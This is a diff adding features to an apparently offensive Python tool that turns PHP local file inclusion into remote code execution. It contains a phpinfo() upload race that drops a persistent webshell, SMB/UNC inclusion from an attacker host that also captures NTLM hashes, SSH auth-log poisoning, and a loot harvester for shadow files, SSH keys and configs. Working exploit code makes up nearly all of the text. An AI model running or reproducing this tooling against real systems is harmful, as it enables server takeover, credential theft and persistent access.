+                    self.successful_methods.append(f'SSH auth-log poisoning ({log})')
+                    return True
+            except Exception:
+                continue
+        print(f"{Fore.RED}[✗] auth logs not includable{Style.RESET_ALL}")
+        return False
+
+    def test_phpinfo_race(self, phpinfo_url: str) -> bool:
+        """Classic LFI + phpinfo() race: multipart upload shows tmp_name in
+        phpinfo output; include it before PHP unlinks it."""
+        print(f"\n{Fore.CYAN}[TEST] phpinfo() tmp-file Race via {phpinfo_url}{Style.RESET_ALL}")
+        import threading
+        marker = f"GNFO{int(time.time()) % 99999}"
+        payload = (f'{marker}<?php file_put_contents("/tmp/.ghostlfi.php",'
+                   f'base64_decode("{base64.b64encode(self.webshells["request"].encode()).decode()}")); ?>')
+        padding = 'A' * 4000   # push tmp_name into the flushed part of the response
+        won = {'ok': False}
+
+        def attempt():
+            try:
+                r = self.session.post(
+                    phpinfo_url + ('&' if '?' in phpinfo_url else '?') + 'a=' + padding,
+                    files={'f': ('g.txt', payload)},
+                    headers={'Cookie': 'x=' + padding[:1000]},
+                    proxies=self.proxy, timeout=10)
+                m = re.search(r'\[tmp_name\]\s*=&gt;\s*(/[^\s<]+)', r.text)
+                if not m:
+                    return
+                tmp = m.group(1)
+                for _ in range(3):
+                    rr = self._send_payload(tmp, timeout=5)
+                    if marker in rr.text:
+                        won['ok'] = True
+                        won['tmp'] = tmp
+                        return
+            except Exception:
+                pass
+
+        threads = [threading.Thread(target=attempt, daemon=True) for _ in range(15)]
+        for t in threads:
+            t.start()
+        for t in threads:
+            t.join(timeout=20)
+        if won['ok']:
+            print(f"{Fore.GREEN}[✓] Race WON -- included {won.get('tmp')}{Style.RESET_ALL}")
+            if self._adopt_dropped_shell('/tmp/.ghostlfi.php'):
+                self.successful_methods.append('phpinfo() tmp-file race')
+                return True
+        print(f"{Fore.RED}[✗] Race lost (needs phpinfo with file_uploads=On; try more runs){Style.RESET_ALL}")
+        return False
+
+    def test_smb_rfi(self, lhost: str) -> bool:
+        """Windows RFI over UNC: include \\\\LHOST\\ghost\\shell.php -- also
+        coerces NTLM auth to you (run Responder/ntlmrelayx)."""
+        print(f"\n{Fore.CYAN}[TEST] UNC / SMB Inclusion (Windows){Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}[*] On your box first:{Style.RESET_ALL}")
+        print(f"    mkdir -p /tmp/ghost_smb && cp shell.php /tmp/ghost_smb/")
+        print(f"    impacket-smbserver -smb2support ghost /tmp/ghost_smb")
+        marker_cmd = 'echo GSMBOK'
+        for unc in (f'\\\\{lhost}\\ghost\\shell.php', f'//{lhost}/ghost/shell.php'):
+            try:
+                r = self._send_payload(unc, extra_params={'cmd': marker_cmd}, timeout=15)
+                if 'GSMBOK' in r.text:
+                    print(f"{Fore.GREEN}[✓] UNC inclusion works: {unc}{Style.RESET_ALL}")
+                    self.rce_method = 'unc'
+                    self.unc_path = unc
+                    self.successful_methods.append('UNC/SMB remote inclusion')
+                    return True
+                print(f"{Fore.YELLOW}[*] Sent {unc} -- check Responder for NTLM hashes even on failure{Style.RESET_ALL}")
+            except Exception:
+                continue
+        return False
+
+    # ---- v2 plumbing -----------------------------------------------------
+    def _looks_like_miss(self, body: str) -> bool:
+        return bool(re.search(r'(failed to open stream|No such file|include\(\):|'
+                              r'Failed opening|open_basedir)', body, re.I))
+
+    def _save_loot(self, name: str, data: str):
+        os.makedirs(self.loot_dir, exist_ok=True)
+        p = os.path.join(self.loot_dir, re.sub(r'[^\w.-]', '_', name)[:120] + '.txt')
+        with open(p, 'w', errors='replace') as fh:
+            fh.write(data)
+
+    def _adopt_dropped_shell(self, path: str) -> bool:
+        """After a one-shot exec dropped a webshell, verify + switch to it."""
+        try:
+            r = self._send_payload(path, extra_params={'cmd': 'echo GDROP$((40+2))'})
+            if 'GDROP42' in r.text:
+                self.rce_method = 'dropped_shell'
+                self.dropped_shell = path
+                print(f"{Fore.GREEN}[+] Persistent webshell adopted: {path}{Style.RESET_ALL}")
+                return True
+        except Exception:
+            pass
+        return False
+
+
+    def _send_payload(self, payload: str, method: str = 'GET', data: str = None,
+                      timeout: int = 10, extra_params: dict = None) -> requests.Response:
+        """Send payload to target. Injection point defaults to the GET/POST
+        parameter, but --cookie/--header/--data values containing the GHOST
+        marker move the payload there (LFI lives in Cookie/Header/body too)."""
         params = {self.parameter: payload}
-        
+        cookies, headers, body = None, None, data
+        if getattr(self, 'inject_cookie', None):
+            cookies = dict(kv.strip().split('=', 1) for kv in
+                           self.inject_cookie.replace('GHOST', payload).split(';') if '=' in kv)
+            params = extra_params or {}
+        if getattr(self, 'inject_header', None):
+            k, _, v = self.inject_header.partition(':')
+            headers = {k.strip(): v.strip().replace('GHOST', payload)}
+            params = extra_params or {}
+        if getattr(self, 'inject_data', None):
+            body = self.inject_data.replace('GHOST', urllib.parse.quote(payload, safe=''))
+            method = 'POST'
+            params = extra_params or {}
+        if extra_params and params is not extra_params:
+            params = {**params, **extra_params}
         if method == 'GET':
-            return self.session.get(self.target_url, params=params, proxies=self.proxy, timeout=timeout)
-        elif method == 'POST':
-            return self.session.post(self.target_url, params=params, data=data, proxies=self.proxy, timeout=timeout)
+            return self.session.get(self.target_url, params=params, cookies=cookies,
+                                    headers=headers, proxies=self.proxy, timeout=timeout)
+        return self.session.post(self.target_url, params=params, data=body,
+                                 cookies=cookies, headers=headers,
+                                 proxies=self.proxy, timeout=timeout)
     
     def _extract_command_output(self, response: str) -> str:
         """Extract clean command output"""
@@ -2809,7 +3429,37 @@ Ghost Ops Security | For Authorized Testing Only
     
     # Generation
     parser.add_argument('--generate', choices=['lfi', 'wrappers', 'shells', 'revshell'], help='Generate payloads')
-    
+
+    # v2: modern LFI2RCE + enumeration methods
+    parser.add_argument('--test-filter-chain', action='store_true',
+                        help='PHP filter-chain (iconv) RCE -- no file write, allow_url_include=Off OK')
+    parser.add_argument('--filter-chain', metavar='PHP_CODE',
+                        help="Just print a filter chain for the given PHP code and exit")
+    parser.add_argument('--source-disclosure', action='store_true',
+                        help='php://filter base64 source read of the app itself')
+    parser.add_argument('--loot', action='store_true',
+                        help='Harvest sensitive files (passwd/shadow/configs/SSH keys/histories)')
+    parser.add_argument('--os-detect', action='store_true', help='Fingerprint target OS/stack via LFI')
+    parser.add_argument('--test-blind', action='store_true',
+                        help='Blind-LFI oracle (response diff + error signatures)')
+    parser.add_argument('--test-session-race', action='store_true',
+                        help='PHP_SESSION_UPLOAD_PROGRESS race (LFI2RCE, no upload dir needed)')
+    parser.add_argument('--test-pearcmd', action='store_true',
+                        help='pearcmd.php argv injection (PHP docker images)')
+    parser.add_argument('--test-environ', action='store_true',
+                        help='/proc/self/environ + /proc/self/fd poisoning via User-Agent')
+    parser.add_argument('--test-auth-log', action='store_true',
+                        help='SSH auth.log poisoning (PHP in SSH username)')
+    parser.add_argument('--phpinfo-url', help='URL of a phpinfo() page for the tmp-file race')
+    parser.add_argument('--test-phpinfo-race', action='store_true',
+                        help='LFI + phpinfo() tmp upload race (needs --phpinfo-url)')
+    parser.add_argument('--smb-rfi', metavar='LHOST',
+                        help='Windows UNC inclusion \\\\LHOST\\ghost\\shell.php (+ NTLM capture)')
+    # v2: alternative injection points (payload replaces the GHOST marker)
+    parser.add_argument('--cookie', help='Inject via cookie, e.g. "lang=GHOST"')
+    parser.add_argument('--header', help='Inject via header, e.g. "X-Forwarded-For: GHOST"')
+    parser.add_argument('--data', help='Inject via POST body, e.g. "page=GHOST&go=1"')
+
     args = parser.parse_args()
     
     # Normalize URL - ensure it has http:// or https://
@@ -2819,7 +3469,15 @@ Ghost Ops Security | For Authorized Testing Only
         print(f"{Fore.YELLOW}[*] Added http:// prefix: {target_url}{Style.RESET_ALL}")
     
     exploiter = UltimateLFIExploiter(target_url, args.parameter, args.proxy)
+    exploiter.inject_cookie = args.cookie
+    exploiter.inject_header = args.header
+    exploiter.inject_data = args.data
     exploiter.print_banner()
+
+    # v2 standalone modes (no live param discovery needed for --filter-chain)
+    if args.filter_chain:
+        print(exploiter.generate_filter_chain(args.filter_chain))
+        sys.exit(0)
     
     # Auto-discover parameter if set to AUTO and not in specific modes
     if args.parameter == 'AUTO' and not any([args.generate, args.fuzz_params]):
@@ -2845,6 +3503,58 @@ Ghost Ops Security | For Authorized Testing Only
         exploiter.show_payloads(args.generate)
         sys.exit(0)
     
+    # v2 technique modes
+    if args.test_filter_chain:
+        ok = exploiter.test_filter_chain_rce()
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.source_disclosure:
+        exploiter.test_source_disclosure()
+        sys.exit(0)
+    if args.loot:
+        exploiter.detect_os_and_stack()
+        exploiter.harvest_loot()
+        sys.exit(0)
+    if args.os_detect:
+        exploiter.detect_os_and_stack()
+        sys.exit(0)
+    if args.test_blind:
+        sys.exit(0 if exploiter.test_blind_lfi() else 1)
+    if args.test_session_race:
+        ok = exploiter.test_session_upload_race()
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.test_pearcmd:
+        ok = exploiter.test_pearcmd()
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.test_environ:
+        ok = exploiter.test_environ_poisoning()
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.test_auth_log:
+        ok = exploiter.test_auth_log_poisoning()
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.test_phpinfo_race:
+        if not args.phpinfo_url:
+            print(f"{Fore.RED}[!] --test-phpinfo-race needs --phpinfo-url{Style.RESET_ALL}")
+            sys.exit(1)
+        ok = exploiter.test_phpinfo_race(args.phpinfo_url)
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+    if args.smb_rfi:
+        ok = exploiter.test_smb_rfi(args.smb_rfi)
+        if ok and args.shell:
+            exploiter.interactive_shell()
+        sys.exit(0 if ok else 1)
+
     # Test specific techniques
     if args.test_bypass:
         exploiter.test_lfi_bypasses()
